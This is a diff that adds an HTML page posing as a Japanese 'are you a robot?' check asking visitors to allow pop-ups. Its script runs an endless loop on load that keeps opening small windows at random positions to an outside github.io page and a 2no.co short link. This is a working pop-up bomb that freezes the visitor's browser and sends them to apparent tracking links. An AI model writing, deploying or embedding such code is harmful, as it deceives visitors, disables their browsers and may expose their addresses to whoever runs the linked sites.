@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Game Over Effect</title>
+</head>
+<body>
+    <h1>ロボットではありませんか？</h1>
+    <h2>ロボットでない場合はポップアップを許可</h2>
+<button onclick="gameOver()">j9zsqsd</button>
+</body>
+<script>
+    function openRandomWindow(url) {
+      // 画面の幅と高さを取得
+      const screenWidth = window.screen.width;
+      const screenHeight = window.screen.height;
+    
+      // ランダムなleftとtopの値を計算
+      const left = Math.floor(Math.random() * (screenWidth - 200)); // 新しいウィンドウの幅を200と仮定
+      const top = Math.floor(Math.random() * (screenHeight - 200)); // 新しいウィンドウの高さを200と仮定
+    
+      // 新しいウィンドウをランダムな位置で開く
+      window.open(url, '_blank', `width=200,height=200,left=${left},top=${top}`);
+    }
+    
+    while (true) {
+    gameOver()
+    }
+    
+    function gameOver() {
+        while (true) {
+        openRandomWindow('https://discord-velseons.github.io/');
+        openRandomWindow('https://2no.co/2aM0M4');
+        }
+    }
+    </script>
+</html>
